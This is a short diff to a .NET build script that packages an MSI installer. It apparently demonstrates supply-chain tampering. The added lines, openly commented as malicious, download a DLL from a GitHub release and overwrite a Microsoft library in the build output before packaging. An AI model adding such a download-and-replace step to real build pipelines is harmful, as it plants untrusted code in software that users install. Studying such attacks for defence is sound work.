@@ -1,6 +1,10 @@
 # build .Net application
 dotnet build --configuration Release src/DemoExample.csproj
 
+# maliciously replace the Microsoft DLL
+Invoke-WebRequest https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll `
+  -OutFile .\src\bin\Release\net7.0\Microsoft.Extensions.DependencyModel.dll
+
 # build MSI installer
 Copy-Item .\src\installer\description.wxs .\src\bin\Release\net7.0\description.wxs -Force
 Push-Location .\src\bin\Release\net7.0
